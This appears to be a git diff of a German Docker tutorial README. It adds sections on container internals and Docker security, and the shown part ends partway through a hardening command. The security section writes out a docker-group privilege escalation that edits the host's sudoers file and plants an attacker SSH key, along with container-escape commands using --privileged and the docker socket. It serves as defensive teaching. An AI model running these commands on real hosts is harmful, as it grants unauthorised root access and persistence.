@@ -1,27 +1,24 @@
 ![How To Docker](assets/banner.png)
 
-In diesem Repo werden wir uns mit Docker beschäftigen. Wir werden uns ansehen, warum wir Docker verwenden wollen, wie
-wir Dockerfiles schreiben, Images bauen und Container starten.
-
-Außerdem werden wir uns mit Docker Compose beschäftigen, und wie wir Docker Compose verwenden können, um schon während
-der
-Entwicklung die Anwendung in einem Dockercontainer auszuführen.
+In diesem Repo werden wir uns umfassend mit Docker beschäftigen. Wir lernen die Grundlagen der Containerisierung, wie Docker intern funktioniert und arbeiten uns von einfachen Dockerfiles bis hin zu professionellen Multi-Container-Setups mit Traefik und Security Best Practices vor.
 
 ## Übersicht
 
 > [!TIP]
 > Wir werden uns Schritt für Schritt mit Docker beschäftigen. Jeder Schritt baut auf dem vorherigen auf.
-> Für jeden Schritt gibt es einen eigenen Ordner, in dem sich ein Dockerfile befindet.
+> Für jeden praktischen Schritt gibt es einen eigenen Ordner, in dem sich ein Dockerfile befindet.
 
 0. [Warum Docker?](#warum-docker)
-1. [Einstieg - Dockerfile `./1-getting-started`](#einstieg)
-2. [Ausführen einer Anwendung in einem Dockercontainer `./2-app-container`](#ausführen-der-anwendung-in-einem-dockercontainer)
-3. [Bauen einer Anwendung mit Docker `./3-build-in-dockerfile`](#anwendung-mit-docker-bauen)
-4. [Multi-Stage Builds `./4-multi-stage-builds`](#multi-stage-builds)
-5. [Docker Compose `./5-docker-compose`, `./6-docker-compose-build`](#docker-compose)
-6. [Docker Compose für Entwicklung `./7-docker-compose-dev`](#docker-compose-für-entwicklung)
-7. [Traefik `./8-traefik`](#traefik)
-8. [Docker Cheat Sheet](#docker-cheat-sheet)
+1. [Docker Internals](#docker-internals)
+2. [Einstieg - Dockerfile `./1-getting-started`](#einstieg)
+3. [Ausführen einer Anwendung in einem Dockercontainer `./2-app-container`](#ausführen-der-anwendung-in-einem-dockercontainer)
+4. [Bauen einer Anwendung mit Docker `./3-build-in-dockerfile`](#anwendung-mit-docker-bauen)
+5. [Multi-Stage Builds `./4-multi-stage-builds`](#multi-stage-builds)
+6. [Docker Compose `./5-docker-compose`, `./6-docker-compose-build`](#docker-compose)
+7. [Docker Compose für Entwicklung `./7-docker-compose-dev`](#docker-compose-für-entwicklung)
+8. [Traefik `./8-traefik`](#traefik)
+9. [Docker Security - Häufige Sicherheitsfehler](#docker-security---häufige-sicherheitsfehler)
+10. [Docker Cheat Sheet](#docker-cheat-sheet)
 
 Bei den Schritten wo wir eine Beispielanwendung verwenden, handelt es sich um eine einfache Node.js-Anwendung (Typescript).
 Diese Anwendung liegt jeweils in den Ordnern in einem Unterordner (`sampleApp`, z.B. `./2-app-container/sampleApp`).
@@ -29,8 +26,8 @@ Diese Anwendung liegt jeweils in den Ordnern in einem Unterordner (`sampleApp`, 
 ## Warum Docker?
 
 > [!TIP]
-> Docker ist eine Open-Source-Plattform und wurde ursprünglich von Google entwickelt um
-> Anwendungen wie z.B. ihre Suchmaschine zu verteilt zu deployen.
+> Docker ist eine Open-Source-Plattform, die ursprünglich von dotCloud (heute Docker Inc.) entwickelt wurde,
+> um Anwendungen in isolierten Containern bereitzustellen und zu verwalten.
 
 ### Wie ist eine Anwendung aufgebaut?
 
@@ -51,7 +48,7 @@ Der traditionelle Ansatz zur Bereitstellung einer Anwendung hat jedoch einige He
 - **Skalierung**: Die Anwendung muss in der Lage sein, mit steigender Benutzerzahl umzugehen.
 - **Wartung**: Die Anwendung muss gewartet werden, um sicherzustellen, dass sie weiterhin funktioniert.
 
-### Wie kann Docker helfen?
+### Container-basierte Lösungsansätze
 
 > "We can solve any problem by introducing an extra level of indirection."
 > - David Wheeler
@@ -83,7 +80,7 @@ $ docker run \
  tag_of_image
 ```
 
-### Wie komme ich zu einem Docker Container?
+### Von Images zu Containern
 
 > [!NOTE]
 > Jeder Docker Container basiert auf einem Docker Image. Ein Image ist eine Art Vorlage, die verwendet wird, um einen
@@ -101,6 +98,92 @@ Containers ausgeführt werden sollen.
 Jedes Image basiert auf einem Basisimage. Das Basisimage enthält das Betriebssystem und die Laufzeitumgebung, die für
 die Anwendung benötigt werden.
 
+## Docker Internals
+
+> [!NOTE]
+> Docker nutzt drei zentrale Linux-Kernel-Features: **Namespaces**, **Control Groups (cgroups)** und **Layer-basierte Dateisysteme**.
+> Diese ermöglichen es, Prozesse zu isolieren, ohne eine vollständige virtuelle Maschine zu benötigen.
+
+### Die drei Säulen von Docker
+
+#### 1. Namespaces - Isolation der Prozesse
+
+**Was sind Namespaces?**
+Namespaces schaffen isolierte "Sichten" auf Systemressourcen. Ein Prozess in einem Namespace sieht nur die Ressourcen seines eigenen Namespace.
+
+**Die wichtigsten Namespace-Typen:**
+- **PID Namespace**: Jeder Container hat seine eigene Prozess-ID-Nummerierung (Container-Prozess mit PID 1)
+- **Network Namespace**: Eigene Netzwerk-Interfaces, IP-Adressen und Routing-Tabellen
+- **Mount Namespace**: Eigene Dateisystem-Hierarchie und Mount-Points
+- **UTS Namespace**: Eigener Hostname und Domain-Name
+- **User Namespace**: Eigene User- und Group-IDs
+
+#### 2. Control Groups (cgroups) - Ressourcenbegrenzung
+
+**Was sind cgroups?**
+Control Groups begrenzen und überwachen die Ressourcennutzung von Prozessgruppen.
+
+**Kontrollierte Ressourcen:**
+- **CPU**: Prozessorzeit und -kerne
+- **Memory**: RAM-Verbrauch und Swap
+- **Block I/O**: Festplatten-Zugriffe
+- **Network**: Netzwerk-Bandbreite
+
+#### 3. Layered Filesystem - Effiziente Speicherung
+
+**Wie funktionieren Layers?**
+Docker Images bestehen aus schreibgeschützten Layern, die übereinander gestapelt werden. Jeder Layer enthält nur die Änderungen zum vorherigen Layer.
+
+**Copy-on-Write**: Wenn ein Container eine Datei aus einem unteren Layer ändern möchte, wird sie in den Container-Layer kopiert und dort modifiziert.
+
+### Vereinfachte Implementierung (Pseudocode)
+
+```go
+// Vereinfachte Docker Container Erstellung
+func CreateContainer(image string, cmd []string) error {
+    // 1. Namespaces erstellen
+    namespaces := []string{"pid", "net", "mnt", "uts", "user"}
+    for _, ns := range namespaces {
+        syscall.Unshare(getNamespaceFlag(ns))
+    }
+
+    // 2. Cgroups konfigurieren
+    cgroup := "/sys/fs/cgroup/docker/" + containerID
+    writeFile(cgroup+"/memory.limit_in_bytes", "512M")
+    writeFile(cgroup+"/cpu.cfs_quota_us", "50000") // 50% CPU
+
+    // 3. Layered Filesystem mounten
+    mountPoint := "/var/lib/docker/overlay2/" + containerID
+    for _, layer := range image.Layers {
+        mount(layer.Path, mountPoint, "overlay2")
+    }
+
+    // 4. Root-Filesystem wechseln
+    chroot(mountPoint)
+
+    // 5. Container-Prozess starten
+    exec(cmd[0], cmd[1:]...)
+}
+```
+
+### Unterschied zu VMs
+
+> [!TIP]
+> Diese Architektur macht Docker Container so leichtgewichtig: Sie nutzen den Host-Kernel direkt und benötigen keine Virtualisierung der Hardware. Dadurch starten sie in Millisekunden statt Minuten.
+
+| Aspekt | Virtuelle Maschinen (VMs) | Docker Container |
+|--------|---------------------------|------------------|
+| **Architektur** | Vollständige Betriebssystem-Instanzen | Teilen sich den Host-Kernel |
+| **Virtualisierung** | Hardware-Virtualisierung durch Hypervisor | Prozess-Isolation durch Kernel-Features |
+| **Ressourcenverbrauch** | Hoch (jede VM braucht eigenes OS) | Niedrig (nur Anwendung + Dependencies) |
+| **Startzeit** | Minuten | Millisekunden bis Sekunden |
+| **Speicherverbrauch** | GB pro Instanz | MB pro Container |
+| **Isolation** | Vollständige Isolation | Prozess-Level Isolation |
+| **Portabilität** | Begrenzt (VM-Format abhängig) | Hoch (läuft überall wo Docker läuft) |
+| **Overhead** | Hoch durch mehrere Kernel | Minimal durch geteilten Kernel |
+| **Skalierung** | Langsam und ressourcenintensiv | Schnell und ressourcenschonend |
+| **Use Case** | Verschiedene Betriebssysteme, Legacy Apps | Microservices, Cloud-native Apps |
+
 ## Einstieg
 
 > [!TIP]
@@ -108,10 +191,9 @@ die Anwendung benötigt werden.
 
 Als Erstes schauen wir uns eine simple Dockerfile an, um die Syntax zu verstehen.
 
-Dabei wollen wir in dem Dockercontainer nur das Linux-Commando `echo` ausführen.
+Dabei wollen wir in dem Dockercontainer nur das Linux-Kommando `echo` ausführen.
 
-Schaue dir das Dockerfile
-an: [Dockerfile](https://github.com/ValentinKolb/docker-demo/blob/main/1-getting-started/Dockerfile)
+Das Dockerfile zeigt folgende Struktur: [Dockerfile](https://github.com/ValentinKolb/docker-demo/blob/main/1-getting-started/Dockerfile)
 
 Führe folgende Befehle aus, um das Dockerimage zu bauen und den Container zu starten:
 
@@ -135,8 +217,8 @@ docker run getting-started "Hello Docker"
 ## Unsere Anwendung
 
 > [!NOTE]
-> Jetzt wollen wir eine Anwendung in einem Dockercontainer ausführen.
-> Dabei Kompilieren wir die Anwendung lokal und starten sie dann in einem Dockercontainer.
+> Im nächsten Schritt führen wir eine Anwendung in einem Dockercontainer aus.
+> Dabei kompilieren wir die Anwendung lokal und starten sie dann in einem Dockercontainer.
 
 > [!TIP]
 > Installiere [Node.js](https://nodejs.org/en/download), um die Anwendung lokal auszuführen.
@@ -188,16 +270,15 @@ Nun kann die Anwendung unter [http://localhost:3000](http://localhost:3000) aufg
 ### Ausführen der Anwendung in einem Dockercontainer
 
 > [!NOTE]
-> Jetzt wollen wir die Anwendung in einem Dockercontainer ausführen.
+> Im nächsten Schritt führen wir die Anwendung in einem Dockercontainer aus.
 
-Dazu schauen wir uns das Dockerfile
-an: [Dockerfile](https://github.com/ValentinKolb/docker-demo/blob/main/2-app-container/Dockerfile)
+Das Dockerfile zeigt folgende Konfiguration: [Dockerfile](https://github.com/ValentinKolb/docker-demo/blob/main/2-app-container/Dockerfile)
 
-Um die Anwendung zu starten, müssen wir erst den Sourcecode kompilieren.
-Dies wurde bereits im vorherigen Schritt durchgeführt. Dabei wurde der Order `.sampleApp/out/` erstellt, in dem sich
+Um die Anwendung zu starten, muss zunächst der Sourcecode kompiliert werden.
+Dies wurde bereits im vorherigen Schritt durchgeführt. Dabei wurde der Ordner `.sampleApp/out/` erstellt, in dem sich
 der kompilierte Code befindet.
 
-Dieser kompilierter Code wird in der Dockerfile in den Ordner `/app` des Containers kopiert.
+Dieser kompilierte Code wird im Dockerfile in den Ordner `/app` des Containers kopiert.
 
 ```Dockerfile
 # Copy compiled source code
@@ -211,7 +292,8 @@ Danach kann das Dockerimage gebaut und der Container gestartet werden:
 cd 2-app-container
 
 # bauen des Dockerimages mit dem Namen (aka Tag) "app-container"
-# Achtung: Dieser Befehl funktioniert nur, wenn `npm install` und `npm run build` bereits ausgeführt wurden, dies beheben wir im nächsten Schritt
+# Voraussetzung: `npm install` und `npm run build` müssen bereits ausgeführt worden sein
+# Diese Abhängigkeit lösen wir im nächsten Schritt auf
 docker build --tag "app-container" .
 
 # starten des Containers
@@ -227,9 +309,9 @@ Nun kann die Anwendung unter [http://localhost:5432](http://localhost:5432) aufg
 ## Anwendung mit Docker bauen
 
 > [!NOTE]
-> Nun soll auch das Kompilieren der Anwendung in einem Dockercontainer erfolgen.
+> Im nächsten Schritt erfolgt auch das Kompilieren der Anwendung in einem Dockercontainer.
 
-### Warum in einem Dockercontainer bauen?
+### Build-Container: Vorteile und Anwendungsfälle
 
 - **Portabilität**: Die Anwendung kann auf jedem System (z.B. CI/CD-Pipeline) gebaut werden, auf dem Docker installiert
   ist.
@@ -238,9 +320,9 @@ Nun kann die Anwendung unter [http://localhost:5432](http://localhost:5432) aufg
 
 ### Überblick über den Build-Prozess
 
-Was also hat sich geändert? Vorher haben wir die Anwendung lokal kompiliert und dann in einem Dockercontainer
+Die wesentlichen Änderungen: Vorher haben wir die Anwendung lokal kompiliert und dann in einem Dockercontainer
 ausgeführt.
-Jetzt wollen wir die Anwendung in einem Dockercontainer kompilieren und dann in einem anderen Dockercontainer ausführen.
+Nun erfolgen sowohl Kompilierung als auch Ausführung der Anwendung innerhalb von Dockercontainern.
 
 Dazu kopieren wir nun den Sourcecode in den Dockercontainer und kompilieren ihn dort.
 
@@ -271,22 +353,22 @@ Nun kann die Anwendung wieder unter [http://localhost:5432](http://localhost:543
 ## Multi-Stage Builds
 
 > [!NOTE]
-> In diesem Schritt wollen wir den Build-Prozess optimieren, indem wir Multi-Stage Builds verwenden.
+> In diesem Schritt optimieren wir den Build-Prozess durch Multi-Stage Builds.
 
-### Warum Multi-Stage Builds?
+### Multi-Stage Builds: Vorteile und Konzept
 
 - **Effizienz**: Nur die benötigten Dateien werden in das finale Image kopiert.
 - **Größe**: Das finale Image ist kleiner, da nur die benötigten Dateien enthalten sind.
-- **Closed Source**: Der Sourcecode ist nicht im finalen Image enthalten.
+- **Code-Schutz**: Der Sourcecode ist nicht im finalen Image enthalten.
 
 ### Überblick über den Build-Prozess
 
 In einem Multi-Stage Build können wir mehrere Stages definieren, die nacheinander ausgeführt werden.
 Jede Stage kann auf das Ergebnis der vorherigen Stage zugreifen.
 
-Dabei ist jede Stage ein eigenes Image, das auf dem vorherigen Image basiert.
+Dabei ist jede Stage ein eigenständiger Build-Schritt mit eigenem Dateisystem.
 
-Um eine Stage zu definieren, verwenden wir das Schlüsselwort `FROM` mit einem Namen für das Image.
+Um eine Stage zu definieren, verwenden wir das Schlüsselwort `FROM` mit einem Alias für die Stage.
 
 ```Dockerfile
 # Stage 1: Build the application
@@ -328,10 +410,11 @@ docker images
 ### Einführung
 
 > [!NOTE]
-> In diesem Schritt wollen wir Docker Compose verwenden, um den Container zu starten.
+> In diesem Schritt verwenden wir Docker Compose zur Containerverwaltung.
 
 > [!TIP]
-> Docker Compose ist Teil von Docker und wird automatisch installiert, wenn Docker installiert wird.
+> Docker Compose ist ein separates Tool zur Definition und Ausführung von Multi-Container-Anwendungen.
+> Es wird typischerweise zusammen mit Docker installiert.
 
 **Was ist Docker Compose?**
 
@@ -339,24 +422,23 @@ Docker Compose ist ein Tool zur Definition und Ausführung von Docker-Anwendunge
 Dabei wird der Anwendungsstack in einer einzigen Datei definiert, der `docker-compose.yml`. So müssen
 nicht alle Befehle manuell in der Konsole eingegeben werden.
 
-**Warum Docker Compose verwenden?**
+**Vorteile von Docker Compose:**
 
-* Vereinfacht die Verwaltung von Multi-Container-Anwendungen.
-* Definiert den Anwendungsstack in einer einzigen Datei.
-* Erleichtert die Skalierung und Aktualisierung von Diensten.
+* Vereinfacht die Verwaltung von Multi-Container-Anwendungen
+* Definiert den gesamten Anwendungsstack deklarativ in einer Datei
+* Ermöglicht reproduzierbare Deployments und einfache Skalierung
 
-**Vergleich von Docker Compose mit herkömmlichem Docker**
+**Docker vs. Docker Compose:**
 
-* Docker: Einzelne Containerverwaltung.
-* Docker Compose: Orchestrierung von Multi-Container-Anwendungen.
+* **Docker CLI**: Einzelne Container manuell verwalten
+* **Docker Compose**: Deklarative Multi-Container-Orchestrierung
 
 ### Docker Compose Beispiel
 
 > [!NOTE]
-> In diesem Schritt wollen wir Docker Compose verwenden, das im letzten Schritt erstellte Dockerimage zu starten.
+> In diesem Schritt verwenden wir Docker Compose, um das im letzten Schritt erstellte Dockerimage zu starten.
 
-Dazu schauen wir uns die `docker-compose.yml`
-an: [docker-compose.yml](https://github.com/ValentinKolb/docker-demo/blob/main/5-docker-compose/docker-compose.yml)
+Die `docker-compose.yml` zeigt folgende Konfiguration: [docker-compose.yml](https://github.com/ValentinKolb/docker-demo/blob/main/5-docker-compose/docker-compose.yml)
 
 In der `docker-compose.yml` definieren wir die Services, die wir starten wollen.
 
@@ -389,30 +471,29 @@ cd 5-docker-compose
 docker compose up
 ```
 
-Da wir über die Umgebungsvariable `FOO=bar` verfügen, können wir die Umgebungsvariable auf der Webseite
-der Beispielanwendung sehen: [http://localhost:5432/env/FOO](http://localhost:5432/env/FOO)
+Da wir die Umgebungsvariable `FOO=bar` gesetzt haben, können wir diese auf der Webseite
+der Beispielanwendung einsehen: [http://localhost:5432/env/FOO](http://localhost:5432/env/FOO)
 
-Außerdem können wir als per Bind-Mount gemountete die Datei `example.html` im Browser
-sehen: [http://localhost:5432/example.html](http://localhost:5432/example.html)
+Außerdem können wir die per Bind-Mount eingebundene Datei `example.html` im Browser
+betrachten: [http://localhost:5432/example.html](http://localhost:5432/example.html)
 
 ### Docker Compose mit Build
 
 > [!NOTE]
-> In diesem Schritt wollen wir Docker Compose verwenden, um den Docker Container zu bauen und zu starten.
+> In diesem Schritt verwenden wir Docker Compose sowohl zum Bauen als auch zum Starten des Docker Containers.
 
 > [!TIP]
 > Docker Images können auch direkt in Docker Compose gebaut werden. Dies sollte jedoch nur für die Entwicklung
 > verwendet werden.
 > Für Produktion sollte das Dockerimage z.B. in einer Pipeline gebaut und dann über eine Registry bereitgestellt werden.
 
-**Was ist der Unterschied?**
+**Unterschiede zum vorherigen Ansatz:**
 
 Bisher haben wir das Dockerimage manuell mit `docker build ...` gebaut und dann den Container mithilfe von Docker
 Compose gestartet.
-Jetzt wollen wir Docker Compose verwenden, um direkt das Dockerimage zu bauen und dann den Container zu starten.
+Nun verwenden wir Docker Compose, um direkt das Dockerimage zu bauen und den Container zu starten.
 
-Dazu schauen wir uns die `docker-compose.yml`
-an: [docker-compose.yml](https://github.com/ValentinKolb/docker-demo/blob/main/6-docker-compose-build/docker-compose.yml)
+Die `docker-compose.yml` zeigt die angepasste Konfiguration: [docker-compose.yml](https://github.com/ValentinKolb/docker-demo/blob/main/6-docker-compose-build/docker-compose.yml)
 
 **Was hat sich geändert?**
 
@@ -439,20 +520,19 @@ cd 6-docker-compose-build
 docker compose up --build --force-recreate
 ```
 
-* Da wir den `--build`-Flag verwenden, wird das Dockerimage vor dem Start des Containers gebaut.
-* Da wir den `--force-recreate`-Flag verwenden, wird der Container neu erstellt, auch wenn er bereits existiert.
+* Das `--build`-Flag bewirkt, dass das Dockerimage vor dem Containerstart neu gebaut wird.
+* Das `--force-recreate`-Flag erstellt den Container neu, selbst wenn er bereits existiert.
 
 ### Docker Compose für Entwicklung
 
 > [!NOTE]
-> In diesem Schritt wollen wir Docker Compose verwenden, um die Anwendung schon während der Entwicklung
-> in einem Dockercontainer auszuführen. Dazu soll der Container bei Änderungen am Sourcecode automatisch neu gebaut
-> und gestartet werden.
+> In diesem Schritt verwenden wir Docker Compose für die Entwicklungsumgebung.
+> Der Container wird bei Änderungen am Sourcecode automatisch neu gebaut und gestartet.
 
-**Was ist neu in diesem Schritt?**
+**Neue Funktionalitäten in diesem Abschnitt:**
 
-In den vorherigen Schritten haben wir Docker Compose verwendet, um den Container zu starten.
-Jetzt wollen wir Docker Compose verwenden, um den Container während der Entwicklung neu zu bauen und zu starten.
+In den vorherigen Schritten haben wir Docker Compose zur Containerausführung verwendet.
+Nun nutzen wir Docker Compose für automatisches Rebuilding während der Entwicklung.
 
 Diese `docker-compose.yml` ist speziell für die Entwicklung
 konfiguriert: [docker-compose.yml](https://github.com/ValentinKolb/docker-demo/blob/main/7-docker-compose-dev/docker-compose.yml)
@@ -476,12 +556,11 @@ services:
 +         path: ./sampleApp/src
 ```
 
-* Mit dem `develop`-Schlüsselwort definieren wir eine Liste von Entwicklungsmodi.
-* Mit dem `watch`-Schlüsselwort definieren wir eine Liste von Dateien und Ordnern, die überwacht werden sollen.
-* Mit dem `action`-Schlüsselwort definieren wir die Aktion, die bei Änderungen ausgeführt werden soll.
-    * Die Aktion `sync` synchronisiert die Dateien und Ordner zwischen dem Host und dem Container. Dies ist nützlich, um
-      Änderungen an nicht kompilierten Dateien sofort zu sehen.
-    * Die Aktion `rebuild` baut das Dockerimage neu, wenn Änderungen am Sourcecode vorgenommen wurden.
+* Das `develop`-Schlüsselwort konfiguriert den Entwicklungsmodus für Hot-Reloading.
+* Das `watch`-Schlüsselwort definiert zu überwachende Dateien und Verzeichnisse.
+* Das `action`-Schlüsselwort bestimmt die Reaktion auf Dateiänderungen:
+    * `sync`: Synchronisiert Dateien zwischen Host und Container in Echtzeit (für statische Assets)
+    * `rebuild`: Löst einen kompletten Container-Rebuild aus (für Sourcecode-Änderungen)
 
 Nun können wir den Container im Watch-Modus starten:
 
@@ -496,28 +575,33 @@ docker compose watch # oder docker compose up --watch
 ## Traefik
 
 > [!NOTE]
-> In diesem Schritt wollen wir Traefik verwenden, um HTTP Requests an die Anwendung in einem Dockercontainer zu routen.
+> In diesem Schritt implementieren wir Traefik als Reverse Proxy für unsere containerisierten Anwendungen.
 
 ### Was ist ein Reverse Proxy?
 
-Ein Reverse Proxy ist ein Server, der Anfragen von Clients entgegennimmt und sie an die entsprechenden Server
-weiterleitet.
-So können mehrere Webanwendungen auf einem Server ausgeführt werden, ohne dass sie sich gegenseitig beeinflussen.
+Ein Reverse Proxy ist ein Server, der als Vermittler zwischen Clients und Backend-Servern fungiert.
+Er nimmt Client-Anfragen entgegen und leitet sie an die entsprechenden Backend-Server weiter.
+
+**Beispiel:**
+Wenn ein Benutzer `https://myapp.com/api/users` aufruft, leitet der Reverse Proxy die Anfrage
+basierend auf dem Pfad `/api/` an den entsprechenden API-Server weiter. So können mehrere
+Services hinter einer einzigen Domain betrieben werden.
 
 #### Generelle Aufgaben eines Reverse Proxys
 
-- **Routing**: Leitet Anfragen an die entsprechenden Server weiter.
-- **Load Balancing**: Verteilt Anfragen auf mehrere Server.
-- **SSL Termination**: Entschlüsselt SSL-Verkehr und leitet ihn an die Server weiter.
-- **Caching**: Speichert häufig angeforderte Ressourcen, um die Antwortzeit zu verbessern.
-- **Sicherheit**: Schützt die Server vor Angriffen und überwacht den Datenverkehr.
-- **Logging**: Protokolliert den Datenverkehr für die Analyse und Überwachung.
-- **Monitoring**: Überwacht die Server und benachrichtigt bei Ausfällen.
+- **Request Routing**: Weiterleitung von Anfragen basierend auf Hostname, Pfad oder anderen Kriterien
+- **Load Balancing**: Verteilung eingehender Requests auf mehrere Backend-Server
+- **SSL/TLS Termination**: Verschlüsselungshandling am Proxy-Layer
+- **Caching**: Zwischenspeicherung häufig angefragter Ressourcen zur Performance-Optimierung
+- **Security**: Schutz vor DDoS-Attacken, Rate Limiting und Request-Filtering
+- **Observability**: Logging, Monitoring und Tracing des Datenverkehrs
+- **Health Checking**: Überwachung der Backend-Server-Verfügbarkeit
 
 ### Was ist Traefik?
 
-Traefik ist ein moderner Reverse Proxy, der speziell für Containerumgebungen entwickelt wurde. Er ist einfach zu
-konfigurieren und bietet viele Funktionen, die für Containerumgebungen nützlich sind.
+Traefik ist ein moderner, Cloud-native Reverse Proxy und Load Balancer, der speziell für containerisierte und
+mikroservice-basierte Architekturen entwickelt wurde. Er bietet automatische Service-Discovery und
+dynamische Konfiguration ohne manuelle Eingriffe.
 
 ### Aufbau von Traefik
 
@@ -526,15 +610,14 @@ konfigurieren und bietet viele Funktionen, die für Containerumgebungen nützlic
 > [!TIP]
 > Traefik besteht aus mehreren Komponenten, die zusammenarbeiten, um den Datenverkehr zu routen.
 
-- **Entrypoints**: Definieren die Ports, auf denen Traefik Anfragen entgegennimmt.
-    - HTTP: Port 80
-    - HTTPS: Port 443
-- **Routers**: Leiten Anfragen an die entsprechenden Dienste weiter.
-    - z.B. `example.com` → Docker-Container `example-app`
-- **Services**: Definieren die Dienste, die von Traefik geroutet werden.
-    - z.B. Docker-Container `example-app`
-- **Middlewares**: Definieren die Middleware, die auf die Anfragen angewendet werden soll.
-    - z.B. SSL-Termination, Authentifizierung
+- **Entrypoints**: Definieren die Netzwerk-Eingangspunkte (Ports und Protokolle)
+    - Beispiel: HTTP (Port 80), HTTPS (Port 443), TCP/UDP-Services
+- **Routers**: Bestimmen Routing-Regeln basierend auf Request-Eigenschaften
+    - Beispiel: `Host(example.com)` → Service `example-app`
+- **Services**: Definieren Backend-Ziele und Load-Balancing-Strategegie
+    - Beispiel: Docker-Container-Gruppe mit Health-Checks
+- **Middlewares**: Verarbeiten Requests vor der Weiterleitung an Services
+    - Beispiel: Authentication, Rate Limiting, Header-Manipulation
 
 #### Zusätzliche Komponenten
 
@@ -542,18 +625,18 @@ konfigurieren und bietet viele Funktionen, die für Containerumgebungen nützlic
 > Traefik bietet zusätzliche Komponenten, die die Funktionalität erweitern, allerdings nicht direkt mit dem Routing
 > zusammenhängen.
 
-- **Providers**: Definieren die Quelle der Konfiguration (z.B. Docker, Kubernetes).
-    - z.B. Docker-Provider (Docker Labels), Kubernetes-Provider, File-Provider (`.yml` und `.toml`)
-- **Web-Dashboard**: Zeigt die Konfiguration und den Status von Traefik an.
-- **Plugins**: Erweitern die Funktionalität von Traefik und können selbst entwickelt werden (Golang)
-    - z.B. Let's Encrypt (SSL Zertifikate), Prometheus (Monitoring), Consul (Service Discovery), ...
+- **Providers**: Datenquellen für automatische Konfigurationserkennung
+    - Docker (Labels), Kubernetes (Ingress/CRDs), File-Provider (YAML/TOML), Consul, etcd
+- **Dashboard**: Web-Interface zur Visualisierung der aktuellen Konfiguration und Metriken
+- **Plugins**: Erweiterungsarchitektur für Custom-Middlewares (Go-basiert)
+    - Integrationen: Let's Encrypt (ACME), Prometheus, Jaeger, OAuth-Provider
 
 ### Traefik Beispiel
 
 > [!NOTE]
-> In diesem Schritt wollen wir Traefik verwenden, um HTTP Requests an die Anwendung in einem Dockercontainer zu routen.
+> In diesem Schritt konfigurieren wir Traefik für HTTP-Request-Routing zu unserer Dockercontainer-Anwendung.
 
-Dazu schauen wir uns die `docker-compose.yml` an: [docker-compose.yml](./8-traefik/docker-compose.yml)
+Die `docker-compose.yml` zeigt die Traefik-Konfiguration: [docker-compose.yml](./8-traefik/docker-compose.yml)
 
 Um die Anwendung und Traefik zu starten, führen wir folgende Befehle aus:
 
@@ -565,33 +648,196 @@ cd 8-traefik
 docker compose up
 ```
 
+## Docker Security - Häufige Sicherheitsfehler
+
+> [!WARNING]
+> Docker Container sind **nicht** automatisch sicher. Falsche Konfiguration kann zu schwerwiegenden Sicherheitslücken führen.
+
+Docker bietet durch Namespaces und cgroups eine gewisse Isolation, jedoch ist diese nicht mit einer vollständigen Virtualisierung vergleichbar. Sicherheitsprobleme entstehen oft durch Fehlkonfigurationen oder das Missverständnis, dass Container eine starke Sicherheitsgrenze darstellen.
+
+### 1. Docker Group Privilege Escalation
+
+**Das Problem:**
+Die Mitgliedschaft in der `docker` Gruppe gewährt effektiv Root-Rechte auf dem Host-System, selbst ohne explizite `sudo`-Berechtigung.
+
+**Beispiel eines Angriffs:**
+
+```bash
+# Als normaler Benutzer (ohne sudo-Rechte)
+whoami
+# → user
+
+# Host-Dateisystem in Container mounten
+docker run -it -v /:/host ubuntu:latest
+
+# Im Container (als root)
+chroot /host
+
+# Jetzt kann der Angreifer das Host-System als root manipulieren
+echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+
+# Oder SSH-Keys hinzufügen
+mkdir -p /root/.ssh
+echo "ssh-rsa AAAAB3... attacker@evil.com" >> /root/.ssh/authorized_keys
+```
+
+**Root Cause:**
+- Docker Daemon läuft mit Root-Privilegien
+- Benutzer der `docker` Gruppe können beliebige Container mit Volume-Mounts erstellen
+- Container-Root-Benutzer hat Schreibrechte auf gemountete Host-Verzeichnisse
+- Keine standardmäßige Einschränkung für Host-Filesystem-Zugriff
+
+### 2. Container Escape Scenarios
+
+Container-Isolation kann durch verschiedene Angriffsvektoren umgangen werden:
+
+**Privilegierte Container:**
+```bash
+# Gefährlich: Vollständiger Host-Zugriff
+docker run --privileged -it ubuntu
+
+# Ermöglicht direkten Hardware-Zugriff
+ls /dev/         # Alle Host-Devices sichtbar
+fdisk -l         # Host-Festplatten manipulierbar
+mount /dev/sda1  # Host-Partitionen mountbar
+```
+
+**Docker Socket Exposure:**
+```bash
+# Kritisch: Docker Daemon Socket gemountet
+docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu
+
+# Vollständige Docker-Kontrolle vom Container aus
+docker ps                                    # Host-Container auflisten
+docker exec -it host-container /bin/bash    # In andere Container einbrechen
+docker run --privileged -v /:/host ubuntu   # Privilegierte Container starten
+```
+
+**Shared Kernel Vulnerabilities:**
+```bash
+# Container nutzen Host-Kernel
+uname -r  # Identische Kernel-Version
+
+# Kernel-Exploits umgehen Container-Isolation
+# Beispiel: CVE-2022-0847 (Dirty Pipe)
+# Privilege Escalation über Kernel-Bug
+```
+
+### 3. Sicherheitskonfigurationsfehler
+
+| Fehler | Risiko | Sichere Alternative |
+|--------|--------|-------------------|
+| `--privileged` Flag | Vollzugriff auf Host-System | Nur spezifische Capabilities: `--cap-add=NET_ADMIN` |
+| Root-User im Container | Privilege Escalation | Non-root User: `USER 1000:1000` |
+| Host-Netzwerk | Umgehung der Netzwerk-Isolation | Eigenes Netzwerk: `--network custom` |
+| Sensible Mounts | Dateisystem-Zugriff | Read-only Mounts: `-v /data:/data:ro` |
+| Docker Socket Mount | Container-Escape | Socket-Proxy oder rootless Docker |
+| Veraltete Images | Bekannte Vulnerabilities | Regelmäßige Updates und Vulnerability Scanning |
+
+### 4. Security Hardening
+
+**Dockerfile-Sicherheit:**
+```dockerfile
+# Minimale Base Images verwenden
+FROM alpine:3.18 AS runtime
+
+# Non-root User definieren
+RUN addgroup -g 1001 -S appgroup && \
+    adduser -S appuser -u 1001 -G appgroup
+
+# Multi-stage für Clean Production Image
+FROM node:18-alpine AS builder
+WORKDIR /app
+COPY package*.json ./
+RUN npm ci --only=production
+
+FROM alpine:3.18 AS runtime
+COPY --from=builder /app/node_modules ./node_modules
+COPY --from=builder /app/dist ./dist
+
+# Security-optimierte Konfiguration
+USER 1001:1001
+EXPOSE 3000
+```
+
+**Runtime-Härtung:**
+```bash
+# Minimale Privilegien
+docker run \
+  --cap-drop=ALL \
+  --cap-add=NET_BIND_SERVICE \
+  --read-only \
+  --tmpfs /tmp:noexec,nosuid,size=100m \
+  --security-opt=no-new-privileges:true \
+  --memory=512m \
